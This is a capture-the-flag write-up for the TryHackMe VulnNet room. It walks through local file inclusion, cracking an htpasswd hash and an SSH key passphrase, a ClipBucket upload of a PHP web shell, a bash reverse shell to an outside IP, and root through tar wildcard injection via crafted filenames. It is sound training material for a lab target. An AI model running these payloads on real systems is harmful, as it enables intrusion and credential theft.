---
tags:
  - THM
  - Linux
  - Medium
  - Leakage
  - LFI
  - Brute-Force
  - CMS
  - File-Upload
  - RCE
  - Cron
---
https://tryhackme.com/room/vulnnet1/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.168.88 vulnnet.thm broadcast.vulnnet.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC vulnnet.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
A JavaScript file `/js/index__7ed54732.js` revealed a subdomain. Found it using [de4js](https://thanhle.io.vn/de4js/):
```javascript
...
function l(a) {
            var e = a.host,
                t = a.chatAlias,
                n = a.callbackAlias,
                s = a.lang;
            return fetch(function (a) {
                var e = a.host,
                    t = a.chatAlias,
                    n = void 0 === t ? "" : t,
                    s = a.callbackAlias,
                    l = void 0 === s ? "" : s,
                    i = a.lang,
                    c = void 0 === i ? "en-US" : i;
                return "".concat(void 0 === e ? "http://broadcast.vulnnet.thm" : e).concat("/", "?_alias=").concat(n, "&_callbackAlias=").concat(l, "&_lang=").concat(c)
...
```
Another JavaScript file `/js/index__d8338055.js` revealed a **hidden URL parameter**:
```javascript
...
n.p = "http://vulnnet.thm/index.php?referer="
...
```
The **parameter** is vulnerable to **file inclusion**:
```console
$ curl -s 'http://vulnnet.thm/?referer=/etc/passwd'
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
...
```
# Exploitation
## File Inclusion
The subdomain `broadcast.vulnnet.thm` requires **access credentials**. So, found them by exploiting **file inclusion** in the main domain:
```console
$ curl -s 'http://vulnnet.thm/?referer=/etc/apache2/sites-available/000-default.conf'
...
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName vulnnet.thm
	DocumentRoot /var/www/main
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/main>
		Order allow,deny
		allow from all
	</Directory>
</VirtualHost>

<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName broadcast.vulnnet.thm
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/html>
		Order allow,deny
		allow from all
		AuthType Basic
		AuthName "Restricted Content"
		AuthUserFile /etc/apache2/.htpasswd
		Require valid-user
	</Directory>
</VirtualHost>
...


$ curl -s 'http://vulnnet.thm/?referer=/etc/apache2/.htpasswd'
...
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
...
```
Crack the **access credentials**:
```console
$ echo 'developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0' > developers.hash

$ hashcat -a 0 -m 1600 --user developers.hash /usr/share/wordlists/rockyou.txt
...
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls
...
```
## File Upload
The subdomain `broadcast.vulnnet.thm` contains a **vulnerable version** of [ClipBucket](https://github.com/MacWarrior/clipbucket-v5):
```html
...
<!-- ClipBucket version 4.0 -->
...
```
The vulnerability consist of a **file upload**. So, we create our own malicious `rev.php` file:
```php
<?php echo "<pre>" . shell_exec($_GET["cmd") . "</pre>"; ?>
```
Wait for connections:
```console
$ nc -lvnp 4444
```
Upload the file:
```console
$ git clone https://github.com/abeljm/Exploit-ClipBucket-4-File-Upload

$ cd Exploit-ClipBucket-4-File-Upload/

$ python3 exploit.py 'broadcast.vulnnet.thm' developers '9972761drmfsls'
...
[+] Path Shell: http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1767723981078791.php

[+] Example Run Shell: http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1767723981078791.php?cmd=whoami
```
Load the file:
```console
$ cmd=$(echo -n 'bash -c "bash -i >& /dev/tcp/192.168.186.238/4444 0>&1"' | urlencode -a)

$ curl -s -H 'Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw==' "http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1767723981078791.php?cmd=$cmd"
```
# Post-Exploitation
## User Migration
There is a **cron job** ran by **root**:
```console
$ cat /etc/crontab
...
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/2   * * * *	root	/var/opt/backupsrv.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
The script `/var/opt/backupsrv.sh` backups files from `server-management` user:
```bash
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```
Found a backup copy of the **SSH private key** for user `server-management`:
```console
$ ls -l /var/backups/
...
-rw-rw-r-- 1 server-management server-management    1484 Jan 24  2021 ssh-backup.tar.gz
...

$ cd /tmp/

$ tar xf /var/backups/ssh-backup.tar.gz

$ ls
id_rsa
```
Transfer the file to the local machine, then try to re-connect as `server-management` and realize we need a **passphrase**:
```console
$ ssh -i id_rsa server-management@vulnnet.thm
...
Enter passphrase for key 'id_rsa':
```
Crack the **passphrase**:
```console
$ ssh2john id_rsa > id_rsa.hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
...
oneTWO3gOyac     (id_rsa)
...
```
Re-connect to the machine and get the **user flag**:
```console
$ ssh -i id_rsa server-management@vulnnet.thm
Enter passphrase for key 'id_rsa':

$ cat /home/server-management/user.txt
```
## Privilege Escalation
If we read the **cron job script** again, we found a some interesting lines:
```bash
...
cd /home/server-management/Documents
backup_files="*"
...
tar czf $dest/$archive_file $backup_files
```
Now, we are able to control the value of `$backup_files`. So, following [GTFOBins guide](https://gtfobins.github.io/gtfobins/tar/), we create specific files for code execution:
```console
$ echo 'chmod u+s /bin/bash' > /home/server-management/Documents/priv

$ touch -- '/home/server-management/Documents/--checkpoint=1'

$ touch -- '/home/server-management/Documents/--checkpoint-action=exec=sh priv'
```
Finally, after the **cron job** executes, we spawn a **root shell** and get the **root flag**:
```console
$ /bin/bash -p

# cat /root/root.txt
```